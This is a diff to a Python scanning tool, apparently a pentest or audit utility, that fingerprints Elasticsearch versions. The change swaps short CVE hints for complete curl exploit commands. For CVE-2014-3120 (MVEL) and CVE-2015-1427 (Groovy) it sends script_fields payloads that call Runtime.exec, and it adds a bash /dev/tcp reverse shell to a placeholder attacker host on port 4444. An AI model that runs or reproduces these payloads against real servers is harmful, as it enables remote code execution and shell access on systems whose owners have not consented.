@@ -3422,20 +3422,42 @@ def _multiline_passes(path, report, store):
                     text[:16384])
                 _target = (f"{_eh.group(1)}:{_eh.group(2) or '9200'}"
                            if _eh else "<es-host>:9200")
-                # CVE hint based on version.
+                # CVE hint based on version. iter-220: order-fix (the
+                # prior <1.4.3 branch swallowed <1.2 too, so the MVEL
+                # arm was unreachable) + inlined curl bodies so the
+                # operator doesn't need to look up the exploit shape.
                 _cve_hint = ""
                 if _ver:
                     try:
                         _major, _minor, _patch = [
                             int(x) for x in (_ver.split(".") + ["0", "0"])[:3]
                         ]
-                        if (_major, _minor, _patch) < (1, 4, 3):
-                            _cve_hint = ("  |  CVE-2015-1427 Groovy "
-                                         "sandbox RCE applies (ES <1.4.3)"
-                                         " - _search with script")
-                        elif (_major, _minor, _patch) < (1, 2, 0):
-                            _cve_hint = ("  |  CVE-2014-3120 MVEL RCE "
-                                         "applies (ES <1.2)")
+                        if (_major, _minor, _patch) < (1, 2, 0):
+                            _cve_hint = (
+                                f"  |  CVE-2014-3120 MVEL RCE (ES <1.2): "
+                                f"curl -s 'http://{_target}/_search' "
+                                f"-H 'Content-Type: application/json' "
+                                f"-d '{{\"size\":1,\"script_fields\":"
+                                f"{{\"pwn\":{{\"script\":\"import "
+                                f"java.util.*; import java.io.*; def "
+                                f"r=Runtime.getRuntime().exec([\\\"bash"
+                                f"\\\",\\\"-c\\\",\\\"id\\\"] as "
+                                f"String[]).text\"}}}}}}'  |  read: "
+                                f".hits.hits[0].fields.pwn[0]")
+                        elif (_major, _minor, _patch) < (1, 4, 3):
+                            _cve_hint = (
+                                f"  |  CVE-2015-1427 Groovy sandbox RCE "
+                                f"(ES <1.4.3): curl -s "
+                                f"'http://{_target}/_search' "
+                                f"-H 'Content-Type: application/json' "
+                                f"-d '{{\"size\":1,\"script_fields\":"
+                                f"{{\"pwn\":{{\"lang\":\"groovy\","
+                                f"\"script\":\"Runtime.getRuntime()."
+                                f"exec(\\\"id\\\").text\"}}}}}}'  |  "
+                                f"read: .hits.hits[0].fields.pwn[0]"
+                                f"  |  reverse shell: swap `id` for "
+                                f"[bash,-c,'bash -i >& /dev/tcp/"
+                                f"<ATTACKER>/4444 0>&1']")
                     except (ValueError, IndexError):
                         pass
                 _ver_str = f" {_ver}" if _ver else ""
